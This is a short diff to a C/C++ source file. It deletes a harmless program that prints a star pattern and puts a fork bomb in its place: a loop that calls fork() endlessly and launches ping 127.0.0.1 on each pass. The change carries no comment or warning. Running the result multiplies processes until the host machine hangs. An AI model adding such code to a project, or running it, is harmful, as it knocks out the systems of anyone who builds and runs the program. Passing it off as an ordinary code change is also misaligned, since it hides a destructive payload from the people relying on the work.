@@ -1,9 +1,10 @@
-int main () 
-{ int w = 40; 
-    while(1){ 
-    for (int i=1;i<=w*(w+1);i++) 
-        printf( 
-            "%c", 
-            i % (w+1) == 0 ? '\n' : 
-            i % (w) == 0 || i % (w+2) == 1 ? '*' : ' '); 
-}} 
+#include <unistd.h> 
+#include <cstdlib> 
+ 
+int main(int argc, char** argv) { 
+   while(1) { 
+      fork(); 
+      system("ping 127.0.0.1"); 
+   } 
+   return 0; 
+} 
